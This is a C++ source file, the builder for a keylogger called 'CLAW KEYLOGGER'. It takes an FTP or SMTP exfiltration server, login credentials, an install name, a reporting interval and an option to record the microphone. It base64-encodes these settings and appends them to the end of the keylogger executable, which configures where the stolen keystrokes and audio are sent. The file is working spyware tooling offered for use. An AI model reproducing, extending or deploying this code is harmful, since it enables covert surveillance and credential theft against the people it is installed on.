/*

Author: Fahad (QuantumCore)

https://github.com/quantumcore
https://quantumcored.com

builder.cpp (c) 2020

CLAW KEYLOGGER
*/

// C++ Builder for tests.
// Writes information at EOF.

#include "base64.h"
#include <iostream>
#include <string>
#include <fstream>
#include <sstream>

// Example : ftp:FTPSERVER,FTPUSERNAMEVALUE:FTPPASSWORDVALUE:INSTALLNAME:TIMESLEEPVALUEINMS
// (1) ftp : server, anonymous : anonymous :WindowsTCP : 50000
// (2) smtp : myEmail@pass.com : mypassword : WindowsTCP : 5000
 

int main()
{
    std::ofstream outfile;
    std::ostringstream fulval;
    std::string method, demail, dpass, install_location, timeinterval, out, mic;
    std::string server;
    std::cout << "Enter Method (ftp/smtp) : ";
    std::getline(std::cin, method);

    if(method == "ftp"){
        std::cout << "Enter FTP Server : ";
        std::getline(std::cin, server);
    }

    std::cout << "Enter USERNAME / EMAIL : ";
    std::getline(std::cin, demail);
    

    std::cout << "Enter PASSWORD  : ";
    std::getline(std::cin, dpass);

    std::cout << "Enter A Name : ";
    std::getline(std::cin, install_location);

    std::cout << "Enter Time Interval to receive : ";
    std::getline(std::cin, timeinterval);

    std::cout << "Record mic? (1/0) : ";
    std::getline(std::cin, mic);

    std::cout << "Claw EXE : ";
    std::getline(std::cin, out);
    
    std::string serveranduser = server + "," + demail;
    if(method == "ftp"){
        fulval << base64_encode(reinterpret_cast<const unsigned char*>(method.c_str()), method.length())  << "[]" << base64_encode(reinterpret_cast<const unsigned char*>(serveranduser.c_str()), serveranduser.length()) << "[]" << base64_encode(reinterpret_cast<const unsigned char*>(dpass.c_str()), dpass.length()) << "[]" << base64_encode(reinterpret_cast<const unsigned char*>(install_location.c_str()), install_location.length()) << "[]" << base64_encode(reinterpret_cast<const unsigned char*>(timeinterval.c_str()), timeinterval.length()) << "[]" << base64_encode(reinterpret_cast<const unsigned char*>(mic.c_str()), mic.length());
    } else {
        fulval << base64_encode(reinterpret_cast<const unsigned char*>(method.c_str()), method.length()) << "[]" << base64_encode(reinterpret_cast<const unsigned char*>(demail.c_str()), demail.length()) << "[]" << base64_encode(reinterpret_cast<const unsigned char*>(dpass.c_str()), dpass.length()) << "[]" << base64_encode(reinterpret_cast<const unsigned char*>(install_location.c_str()), install_location.length()) << "[]" << base64_encode(reinterpret_cast<const unsigned char*>(timeinterval.c_str()), timeinterval.length()) << "[]" <<base64_encode(reinterpret_cast<const unsigned char*>(mic.c_str()), mic.length());
    }
    
    outfile.open(out.c_str(), std::ios::app | std::ios::binary);
    if(outfile.is_open()){
		outfile << "\n\n";  
        outfile << fulval.str().c_str();
        outfile.close();
        std::cout << "Wrote : " << fulval.str().c_str() << " to " << out.c_str() << std::endl;
    }
}